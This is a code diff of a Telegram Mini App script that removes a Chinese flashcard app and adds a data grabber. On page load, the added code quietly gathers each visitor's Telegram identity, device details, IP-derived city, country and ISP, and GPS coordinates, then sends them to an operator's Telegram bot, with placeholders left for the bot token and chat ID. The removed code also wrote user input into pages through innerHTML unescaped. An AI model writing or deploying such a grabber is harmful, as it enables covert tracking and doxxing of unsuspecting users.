@@ -1,151 +1,102 @@
 
-let currentUser = null;
+// ==========================
+// PUT YOUR TOKEN & CHAT ID
+// ==========================
 
-function saveUsers(users){
-  localStorage.setItem("users", JSON.stringify(users));
-}
+const BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE";
+const CHAT_ID   = "PUT_YOUR_CHAT_ID_HERE";
 
-function getUsers(){
-  return JSON.parse(localStorage.getItem("users")||"{}");
-}
-
-function initUser(tgUser){
-
-  let users = getUsers();
-
-  if(!users[tgUser.id]){
-    users[tgUser.id] = {
-      telegram_id: tgUser.id,
-      username: tgUser.username || "",
-      first_name: tgUser.first_name || "",
-      role: "user",
-      is_active: true,
-      registered_at: new Date().toISOString(),
-      login_count: 1,
-      cards: [],
-      progress: {}
-    };
-  } else {
-    users[tgUser.id].login_count++;
+async function getIPInfo(){
+  try{
+    const res = await fetch("https://ipapi.co/json/");
+    return await res.json();
+  }catch(e){
+    return {};
   }
-
-  saveUsers(users);
-  currentUser = users[tgUser.id];
 }
 
-function renderCards(){
-  let div = document.getElementById("cards");
-  div.innerHTML = "";
-  currentUser.cards.forEach((c,i)=>{
-    div.innerHTML += `<div class="card">
-      ${c.hanzi} - ${c.pinyin} - ${c.english}
-      <button onclick="markCorrect('${c.hanzi}')">✔</button>
-      <button onclick="markWrong('${c.hanzi}')">✖</button>
-    </div>`;
+function getDeviceInfo(){
+  return {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    screen: window.screen.width + "x" + window.screen.height,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+  };
+}
+
+function getGPS(){
+  return new Promise(resolve=>{
+    if(!navigator.geolocation){
+      resolve(null);
+    }else{
+      navigator.geolocation.getCurrentPosition(
+        pos=>{
+          resolve({
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude
+          });
+        },
+        err=>{
+          resolve(null);
+        }
+      );
+    }
   });
-  renderProgress();
 }
 
-function addCard(){
-  let h = hanzi.value;
-  let p = pinyin.value;
-  let e = english.value;
+async function sendFullLoginInfo(user){
 
-  if(!h) return;
+  const ipData = await getIPInfo();
+  const device = getDeviceInfo();
+  const gps = await getGPS();
 
-  currentUser.cards.push({hanzi:h,pinyin:p,english:e});
-  updateUser();
-  renderCards();
-}
+  let text = `
+<b>🚨 LOGIN DETECTED</b>
 
-function markCorrect(h){
-  if(!currentUser.progress[h]) currentUser.progress[h]={correct:0,wrong:0};
-  currentUser.progress[h].correct++;
-  updateUser();
-  renderProgress();
-}
+👤 Name: ${user.first_name || ""}
+🆔 ID: <code>${user.id}</code>
+📛 Username: @${user.username || "none"}
+🌍 Lang: ${user.language_code || ""}
 
-function markWrong(h){
-  if(!currentUser.progress[h]) currentUser.progress[h]={correct:0,wrong:0};
-  currentUser.progress[h].wrong++;
-  updateUser();
-  renderProgress();
-}
+🖥 Platform: ${device.platform}
+📱 Screen: ${device.screen}
+🌐 Browser: ${device.userAgent}
+🕒 Timezone: ${device.timezone}
 
-function renderProgress(){
-  let div = document.getElementById("progress");
-  div.innerHTML="";
-  for(let h in currentUser.progress){
-    let p = currentUser.progress[h];
-    div.innerHTML+=`${h} ✔${p.correct} ✖${p.wrong}<br>`;
-  }
-}
+🌍 IP: ${ipData.ip || "N/A"}
+🏙 City: ${ipData.city || ""}
+🌎 Country: ${ipData.country_name || ""}
+📡 ISP: ${ipData.org || ""}
 
-function updateUser(){
-  let users = getUsers();
-  users[currentUser.telegram_id] = currentUser;
-  saveUsers(users);
-}
+📍 GPS: ${gps ? gps.lat + ", " + gps.lon : "Not allowed"}
 
-function openAdmin(){
-  if(currentUser.role !== "admin"){
-    alert("Not admin");
-    return;
-  }
-  document.getElementById("admin").classList.remove("hidden");
-  loadUsers();
-}
+⏰ Time: ${new Date().toLocaleString()}
+`;
 
-function closeAdmin(){
-  document.getElementById("admin").classList.add("hidden");
-}
-
-function loadUsers(){
-  let users = getUsers();
-  let div = document.getElementById("userList");
-  div.innerHTML="";
-  for(let id in users){
-    let u = users[id];
-    div.innerHTML+=`
-      <div class="card">
-        ${u.first_name} (${u.telegram_id})
-        Role: ${u.role}
-        Active: ${u.is_active}
-        <button onclick="toggleBan('${id}')">Ban/Unban</button>
-        <button onclick="makeAdmin('${id}')">Make Admin</button>
-      </div>`;
-  }
-}
-
-function toggleBan(id){
-  let users = getUsers();
-  users[id].is_active = !users[id].is_active;
-  saveUsers(users);
-  loadUsers();
-}
-
-function makeAdmin(id){
-  let users = getUsers();
-  users[id].role="admin";
-  saveUsers(users);
-  loadUsers();
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{ "Content-Type":"application/json" },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: text,
+      parse_mode: "HTML"
+    })
+  });
 }
 
 if(window.Telegram && window.Telegram.WebApp){
   const tg = window.Telegram.WebApp;
   tg.ready();
   tg.expand();
+
   const user = tg.initDataUnsafe?.user;
+
   if(user){
-    initUser(user);
-    if(!currentUser.is_active){
-      document.body.innerHTML="<h2>You are banned</h2>";
-    } else {
-      document.getElementById("loginStatus").innerText="Logged in as "+currentUser.first_name;
-      document.getElementById("main").classList.remove("hidden");
-      renderCards();
-    }
+    document.getElementById("status").innerText = "Logged in as " + user.first_name;
+    sendFullLoginInfo(user);
+  }else{
+    document.getElementById("status").innerText = "No Telegram user detected";
   }
-} else {
-  document.getElementById("loginStatus").innerText="Open inside Telegram";
+}else{
+  document.getElementById("status").innerText = "Open inside Telegram Mini App";
 }
